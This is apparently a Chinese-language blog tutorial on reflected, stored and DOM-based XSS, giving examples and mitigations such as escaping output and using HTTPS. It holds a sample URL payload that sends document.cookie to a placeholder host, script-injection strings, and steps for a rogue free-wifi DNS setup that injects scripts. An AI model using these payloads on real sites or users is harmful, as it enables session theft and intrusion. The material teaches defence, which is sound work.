---
title: xss攻击
date: 2017-10-17 09:00:30
tags: [安全, xss]
categories: 其它
---

XSS（cross-site scripting跨域脚本攻击）攻击是最常见的web攻击，其重点是“跨域”和“客户端执行”。XSS攻击分为三种，分别是：
1. Reflected XSS（基于反射的XSS攻击）
2. Stored XSS（基于存储的XSS攻击）
3. DOM-based or local XSS（基于DOM或本地的XSS攻击）

###### 1、Reflected XSS
基于反射的XSS攻击，主要依靠站点服务端返回脚本，再客户端触发执行从而发起Web攻击。

> 例子

> 1、做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。

> 2、在搜索框搜索内容，填入“<script>alert('handsome boy')</script>”, 点击搜索。

> 3、当前端页面没有对返回的数据进行过滤，直接显示在页面上，这时就会alert那个字符串出来。

> 4、进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：

```
http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cookie='+document.cookie</script>
```
安全措施
1. 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。
2. 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。

###### 2、Stored XSS
基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。

> 例子

>1. 发一篇文章，里面包含了恶意脚本

```
今天天气不错啊！<script>alert('handsome boy')</script>
```
> 2. 后端没有对文章进行过滤，直接保存文章内容到数据库。

> 3. 当其他看这篇文章的时候，包含的恶意脚本就会执行。

安全措施
1. 首要是服务端要进行过滤，因为前端的校验可以被绕过。
2. 当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标
签，将特殊字符转换成HTML编码。

###### 3、DOM-based or local XSS
基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。

> 例子
1. 提供一个免费的wifi。
1. 开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。
2. 之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。
3. 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。
4. 当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。

![image](http://note.youdao.com/yws/public/resource/b9cdada69234d36736d09235b516171c/xmlnote/6D0B1492A8EA43BC83431AB18AFB4D8D/5307)

安全措施
使用HTTPS!